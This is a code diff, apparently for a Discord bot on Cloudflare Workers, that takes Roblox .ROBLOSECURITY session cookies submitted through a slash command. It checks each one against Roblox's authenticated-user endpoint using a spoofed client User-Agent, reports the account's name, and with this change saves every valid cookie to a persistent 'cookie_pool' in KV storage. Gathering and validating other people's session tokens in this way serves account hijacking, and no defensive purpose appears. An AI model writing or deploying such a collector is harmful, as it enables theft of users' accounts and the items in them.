@@ -3,6 +3,8 @@ import re
 from workers import fetch
 
 _TOKEN_RE = re.compile(r"^_\|WARNING:[^|\s]+\|_[A-Za-z0-9._-]+$")
+_KV_POOL_KEY = "cookie_pool"
+
 
 def _normalize_cookie(raw: str) -> str:
     value = raw.strip()
@@ -11,16 +13,38 @@ def _normalize_cookie(raw: str) -> str:
     return value
 
 
+def _extract_cookie_option(message: dict) -> str:
+    options = ((message.get("data") or {}).get("options")) or []
+    for opt in options:
+        if opt.get("name") == "cookie":
+            return str(opt.get("value") or "")
+    return ""
+
+
+def _ephemeral(content: str) -> dict:
+    return {
+        "type": 4,
+        "data": {
+            "content": content,
+            "flags": 64,
+        },
+    }
+
+
 async def _check_cookie_alive(cookie_val: str) -> tuple[bool, str]:
     res = await fetch(
         "https://users.roblox.com/v1/users/authenticated",
         headers={
             "Cookie": f".ROBLOSECURITY={cookie_val}",
             "Accept": "application/json",
+            "User-Agent": "Roblox/WinInet",
         },
     )
     if res.status != 200:
-        return False, f"Roblox auth check failed (HTTP {res.status}; cookie may be expired or termed)."
+        return (
+            False,
+            f"Roblox auth check failed (HTTP {res.status}; cookie may be expired, invalid, or termed).",
+        )
 
     try:
         data = json.loads(await res.text())
@@ -35,12 +59,28 @@ async def _check_cookie_alive(cookie_val: str) -> tuple[bool, str]:
     return True, f"Valid cookie for **{username}** (`{user_id}`)."
 
 
-def _extract_cookie_option(message: dict) -> str:
-    options = ((message.get("data") or {}).get("options")) or []
-    for opt in options:
-        if opt.get("name") == "cookie":
-            return str(opt.get("value") or "")
-    return ""
+async def _save_to_kv(env, cookie_val: str) -> tuple[bool, str]:
+    kv = getattr(env, "COOKIES_KV", None)
+    if kv is None:
+        return (
+            False,
+            "Cookie was verified, **but `COOKIES_KV` is not bound in `wrangler.toml`**—nothing was saved.",
+        )
+
+    existing_raw = await kv.get(_KV_POOL_KEY)
+    try:
+        pool = json.loads(existing_raw) if existing_raw else []
+        if not isinstance(pool, list):
+            pool = []
+    except Exception:
+        pool = []
+
+    if cookie_val in pool:
+        return True, f"Already in pool ({len(pool)} total)."
+
+    pool.append(cookie_val)
+    await kv.put(_KV_POOL_KEY, json.dumps(pool))
+    return True, f"Saved to KV ({len(pool)} total in pool)."
 
 
 async def run(message: dict, env):
@@ -48,38 +88,17 @@ async def run(message: dict, env):
     cookie_val = _normalize_cookie(raw_cookie)
 
     if not cookie_val or not _TOKEN_RE.match(cookie_val):
-        return {
-            "type": 4,
-            "data": {
-                "content": "Invalid format. Expected a `.ROBLOSECURITY` token starting with `_|WARNING:-DO-NOT-SHARE--Sharing-this-...`.",
-                "flags": 64,
-            },
-        }
+        return _ephemeral(
+            "Invalid `.ROBLOSECURITY` format. Expected a token starting with `_|WARNING:...`."
+        )
 
     ok, detail = await _check_cookie_alive(cookie_val)
     if not ok:
-        return {
-            "type": 4,
-            "data": {
-                "content": f"Cookie rejected: {detail}",
-                "flags": 64,
-            },
-        }
+        return _ephemeral(f"Cookie rejected: {detail}")
 
-    # Example persistence via a Cloudflare KV binding named COOKIES_KV:
-    # kv = getattr(env, "COOKIES_KV", None)
-    # if kv is not None:
-    #     existing_raw = await kv.get("cookie_pool")
-    #     pool = json.loads(existing_raw) if existing_raw else []
-    #     if cookie_val not in pool:
-    #         pool.append(cookie_val)
-    #         await kv.put("cookie_pool", json.dumps(pool))
+    saved, storage_msg = await _save_to_kv(env, cookie_val)
+    if not saved:
+        return _ephemeral(f"{detail}\n{storage_msg}")
 
-    return {
-        "type": 4,
-        "data": {
-            "content": f"Cookie verified and added. {detail}",
-            "flags": 64,
-        },
-    }
-  
+    return _ephemeral(f"Cookie verified and added. {detail}\n{storage_msg}")
+    
